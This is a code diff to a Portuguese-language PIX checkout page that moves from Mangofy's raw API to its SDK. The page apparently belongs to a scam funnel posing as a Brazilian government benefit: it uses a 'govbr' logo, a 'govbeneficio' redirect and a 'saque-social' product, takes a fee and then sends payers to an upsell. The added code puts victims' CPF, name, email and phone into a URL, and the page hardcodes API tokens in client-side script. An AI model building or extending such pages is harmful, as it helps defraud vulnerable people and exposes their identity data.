@@ -173,7 +173,7 @@ document.head.appendChild(a);
 <header>
   <div class="logo">
     <!-- TROQUE AQUI pela sua logo: coloque o arquivo na pasta images/ -->
-    <img src="images/govbr.png" style="width:90px;margin:10px;" alt="Logo">
+    <img src="images/logo.png" style="width:90px;margin:10px;" alt="Logo">
   </div>
   <div class="icons">
     <button><i class="fas fa-ellipsis-v"></i></button>
@@ -276,14 +276,11 @@ document.head.appendChild(a);
   </p>
 </footer>
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+<script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
 <script>
   /* ══════════════════════════════════════════════════════════════
-     CONFIGURAÇÕES — MANGOFY API
+     CONFIGURAÇÕES
      ══════════════════════════════════════════════════════════════ */
-  var MANGOFY_API_URL   = 'https://checkout.mangofy.com.br/api/v1/payment';
-  var MANGOFY_API_KEY   = 'vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e';
-  var MANGOFY_STORE     = '1e9d4642a8cff56ee7212167bafd6235';
-
   var PIX_VALOR_CENTS   = 6490;
   var PIX_DESCRICAO     = 'Front';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
@@ -293,7 +290,7 @@ document.head.appendChild(a);
   /* ── CREDENCIAL DA API UTMIFY ── */
   var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
 
-  var _pixCode='',_pixPaymentCode='',_pixTimer=null,_pixQRFeito=false,_checkoutDisparado=false;
+  var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
   var _pixCreatedAt='';
   var _p=new URLSearchParams(window.location.search);
   var _nome=(_p.get('nome')||'').trim();
@@ -385,6 +382,12 @@ document.head.appendChild(a);
   function utmRedirectUrl() {
     var base = PIX_REDIRECT;
     var params = [];
+    /* Dados do cliente para o upsell */
+    if (_nome)  params.push('nome='     + encodeURIComponent(_nome));
+    if (_cpf)   params.push('cpf='      + encodeURIComponent(_cpf));
+    if (_email) params.push('email='    + encodeURIComponent(_email));
+    if (_fone)  params.push('telefone=' + encodeURIComponent(_fone));
+    /* UTMs */
     if (_utm_source)   params.push('utm_source='   + encodeURIComponent(_utm_source));
     if (_utm_medium)   params.push('utm_medium='   + encodeURIComponent(_utm_medium));
     if (_utm_campaign) params.push('utm_campaign=' + encodeURIComponent(_utm_campaign));
@@ -432,73 +435,27 @@ document.head.appendChild(a);
   function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixPaymentCode)});}catch(e){}}
 
   /* ══════════════════════════════════════════════════════════════
-     CRIA COBRANÇA PIX VIA MANGOFY
+     CRIA COBRANÇA PIX VIA MANGOFY SDK (generatePix)
      ══════════════════════════════════════════════════════════════ */
   async function pixIniciar(){
     document.getElementById('pix-loading').style.display='block';
     document.getElementById('pix-erro').style.display='none';
     document.getElementById('pix-main').style.display='none';
     _pixQRFeito=false;
-    if(_pixTimer){clearInterval(_pixTimer);_pixTimer=null;}
     ttqIdentify();
     try{
-      var nomeEnvio=nomeOk||'Cliente';
-      if(nomeEnvio.trim().split(' ').filter(Boolean).length<2)nomeEnvio+=' Pagador';
-      var cpfEnvio=_cpf.replace(/\D/g,'');
-      var emailEnvio=_email&&_email.indexOf('@')>0?_email:gerarEmailAleatorio();
-      var foneEnvio=(_fone||'').replace(/\D/g,'')||gerarFoneAleatorio();
-
-      var payload={
-        store_code:      MANGOFY_STORE,
-        payment_method:  'pix',
-        payment_format:  'regular',
-        installments:    1,
-        payment_amount:  PIX_VALOR_CENTS,
-        shipping_amount: 0,
-        items: [{
-          title:    PIX_DESCRICAO,
-          price:    PIX_VALOR_CENTS,
-          quantity: 1
-        }],
-        customer:{
-          name:     nomeEnvio,
-          document: cpfEnvio || '00000000000',
-          email:    emailEnvio,
-          phone:    foneEnvio
-        },
-        pix:{
-          expires_in_days: 1
-        }
+      var config = {
+        total_price: PIX_VALOR_CENTS / 100,
+        items: [
+          { name: PIX_DESCRICAO, price: PIX_VALOR_CENTS / 100, quantity: 1 }
+        ]
       };
 
-      var res=await fetch(MANGOFY_API_URL,{
-        method:'POST',
-        headers:{
-          'Content-Type':  'application/json',
-          'Accept':        'application/json',
-          'Authorization': MANGOFY_API_KEY,
-          'Store-Code':    MANGOFY_STORE
-        },
-        body:JSON.stringify(payload)
-      });
+      var response = await generatePix(config);
+      if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX');
 
-      var data=await res.json();
-      if(!res.ok||!data.payment_code) throw new Error('Erro ao gerar PIX');
-
-      _pixPaymentCode=data.payment_code;
-      _pixCreatedAt=utmifyFmtDate(new Date());
-
-      /* Extrair código PIX copia-e-cola da resposta Mangofy */
-      _pixCode = data.pix_code
-              || data.pix_qr_code
-              || (data.pix && (data.pix.qr_code || data.pix.code || data.pix.emv || data.pix.pix_code))
-              || '';
-
-      /* Extrair URL do QR Code */
-      var qrUrl = data.pix_qr_code_url
-               || data.qr_code_url
-               || (data.pix && (data.pix.qr_code_url || data.pix.qr_code_image))
-               || '';
+      _pixCode = response.pixCode || '';
+      _pixCreatedAt = utmifyFmtDate(new Date());
 
       var valorFmt='R$ '+(PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
       document.getElementById('pix-nome-show').textContent=nomeOk||'Cliente';
@@ -510,8 +467,8 @@ document.head.appendChild(a);
       /* QR Code */
       var wrap=document.getElementById('pix-qr-img');wrap.innerHTML='';
       var imgEl=document.createElement('img');
-      if(qrUrl){
-        imgEl.src=qrUrl;
+      if(response.qrCodeImage){
+        imgEl.src=response.qrCodeImage;
       } else if(_pixCode){
         imgEl.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
       }
@@ -523,7 +480,6 @@ document.head.appendChild(a);
       ttqViewContent();
       ttqInitiateCheckout();
       utmifyNotificar('waiting_payment');
-      pixPolling();
     }catch(err){
       console.error('Erro PIX Mangofy:', err);
       document.getElementById('pix-loading').style.display='none';
@@ -532,31 +488,13 @@ document.head.appendChild(a);
   }
 
   /* ══════════════════════════════════════════════════════════════
-     POLLING DE STATUS VIA MANGOFY
+     CALLBACK AUTOMÁTICO DA MANGOFY — chamado pelo SDK quando
+     o pagamento é aprovado
      ══════════════════════════════════════════════════════════════ */
-  function pixPolling(){
-    if(!_pixPaymentCode)return;
-    var tentativas=0;
-    _pixTimer=setInterval(async function(){
-      tentativas++;if(tentativas>180){clearInterval(_pixTimer);return;}
-      try{
-        var r=await fetch(MANGOFY_API_URL+'/'+encodeURIComponent(_pixPaymentCode),{
-          method:'GET',
-          headers:{
-            'Accept':        'application/json',
-            'Authorization': MANGOFY_API_KEY,
-            'Store-Code':    MANGOFY_STORE
-          }
-        });
-        var s=await r.json();
-        if(s.payment_status==='approved'){
-          clearInterval(_pixTimer);
-          ttqPurchase();
-          await utmifyNotificar('paid');
-          setTimeout(function(){window.location.href=utmRedirectUrl();},800);
-        }
-      }catch(e){}
-    },5000);
+  async function paymentApproved(){
+    ttqPurchase();
+    await utmifyNotificar('paid');
+    window.location.href = utmRedirectUrl();
   }
 
   function pixAba(aba){
